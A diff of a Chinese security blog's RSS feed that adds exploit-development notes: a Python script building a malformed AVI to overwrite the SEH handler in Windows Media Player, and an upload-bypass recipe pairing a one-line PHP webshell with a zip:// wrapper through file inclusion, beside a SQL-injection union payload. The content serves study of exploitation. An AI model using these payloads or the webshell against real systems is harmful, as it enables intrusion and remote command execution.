@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 22 Aug 2016 14:34:54 +0800</pubDate>
-    <lastBuildDate>Mon, 22 Aug 2016 14:34:54 +0800</lastBuildDate>
+    <pubDate>Tue, 23 Aug 2016 07:47:48 +0800</pubDate>
+    <lastBuildDate>Tue, 23 Aug 2016 07:47:48 +0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
@@ -1437,8 +1437,65 @@ g
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-5.png&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;此时esp=0A80FD04,而可控输入的数据所在的内存地址为01c2caf8,0a80fd04-01c2caf8=8BE320C=146682380个字节
-=139.887218475341796875 M大小
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    此时esp=0A80FD04,而可控输入的数据所在的内存地址为01c2caf8,0a80fd04-01c2caf8=8BE320C=146682380个字节
+    =139.887218475341796875 M大小,可见数据量不小,这样肯定会覆盖很多数据,在执行到retn前必然会引发异常,所以想通过
+    覆盖retn达到控制eip是不可取的
+
+2&amp;gt;超长数据覆盖栈中的seh
+    对应1中可观察到内存中的数据为cinepak_codec_data1字段时,eip=73b721ed,alt+v,查看seh,结果如下:
+        SEH 链用于  线程  000006D4
+        地址       SE处理程序
+        0A80FFDC   kernel32.7C839AC0
+    要想覆盖到0a80ffdc处,需要覆盖0a80ffdc+4-01c2caf8=146683112个字节=139.88791656494140625 M大小,重新修改生成
+    poc.avi的python代码,尝试覆盖到seh处理程序的地址,从1c2caf8到poc.avi的最后一个构造的数据所在的字符共有105个字
+    节,需要在后面加多146683112-105=146683007个字节,再加4个字节可以覆盖seh的异常处理程序指针,也即146683011个字节
+    ,构造代码如下,在原来的代码中加入
+        my_data=&#39;B&#39;*146683011
+        avifile.write(my_data)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
+ 
+def main():
+ 
+    aviHeaders = &#39;\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
+    padding = &#39;\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00&#39;
+    movi_tag = &#39;\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00&#39;
+    cinepak_codec_data1 = &#39;\x00\x00\x00\x68\x01\x60\x01\x20&#39;
+    number_of_coded_strips = &#39;\x00\x10&#39;
+    cinepak_codec_data2 = &#39;\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00&#39;
+    idx_tag = &#39;\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00&#39;
+
+    my_data=&#39;B&#39;*146683011
+     
+    avifile = open(&#39;poc.avi&#39;, &#39;wb+&#39;)
+    avifile.write(aviHeaders)
+    avifile.write(padding)
+    avifile.write(movi_tag)
+    avifile.write(cinepak_codec_data1)
+    avifile.write(number_of_coded_strips)
+    avifile.write(cinepak_codec_data2)
+    avifile.write(idx_tag)
+
+    avifile.write(my_data)
+     
+    avifile.close()
+    print &#39;[-] AVI file generated&#39;
+     
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ubuntu下新生成的pov.avi文件146.7M,拷贝到winxp中,用wmpalyer.exe在od附加下打开,同样单步到73b721ed处,在提示窗口中
+右键在数据窗口中跟随数值,如下图
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
@@ -1848,7 +1905,6 @@ id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as ch
       <item>
         <title>fckeditor各版本绕过</title>
         <description>&lt;h3 id=&quot;x00-fckeditor&quot;&gt;0x00 fckeditor上传漏洞总结&lt;/h3&gt;
-
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sec.chinabyte.com/206/13708206.shtml
 http://www.cnbraid.com/2015/07/09/fckeditor/
 http://www.it610.com/article/1842939.htm
@@ -1888,6 +1944,17 @@ http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;l
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;上传时,延迟一下再上传,有时能bypass admin,用到firefox tamper插件
     https://www.youtube.com/watch?v=6hJ-d2NYLBg
 2&amp;gt;双文件上传
+3&amp;gt;上传以图片后缀名为后缀的压缩文件,文件实际是一个webshell.php文件的压缩文件(zip),利用lfi漏洞并将lfi要包含
+  的文件的参数赋值为:
+    zip://archive.zip#webshell.php
+    或
+    zip://archive.zip#webshell.php&amp;amp;param1=system&amp;amp;param2=ls   ===&amp;gt;这里对应webshell.php为:
+        &amp;lt;?php $_GET[&#39;param1&#39;]($_GET[&#39;param2&#39;]);?&amp;gt;
+  这里适用的情况为:
+    a&amp;gt;可上传任意内容文件(通过修改Content-Type等达到目的),但文件会被重命令为以png为后缀文件
+    b&amp;gt;找到了lfi漏洞,但是lfi漏洞不能包函.|./|..|..\|...等情况
+  更多细节:
+    https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
@@ -3334,6 +3401,15 @@ noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
 &lt;span class=&quot;p&quot;&gt;171.&lt;/span&gt;windbg中找不到symbol路径解决方法:
     .sympath srv&lt;span class=&quot;ge&quot;&gt;*c:symbols*&lt;/span&gt;http://msdl.microsoft.com/download/symbols
     .reload /f
+&lt;span class=&quot;p&quot;&gt;172.&lt;/span&gt;《深入理解计算机系统》读书参照
+    http://wdxtub.com/2016/04/16/thin-csapp-0/
+    http://www.voidcn.com/blog/zym0017d/article/p-540879.html
+&lt;span class=&quot;p&quot;&gt;173.&lt;/span&gt;实用的搜索引擎
+    http://kaopu.so/
+&lt;span class=&quot;p&quot;&gt;174.&lt;/span&gt;awk实用指南
+    http://awk.readthedocs.io/en/latest/chapter-one.html
+&lt;span class=&quot;p&quot;&gt;175.&lt;/span&gt;ssrf相关
+    http://evilcos.me/?p=221
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
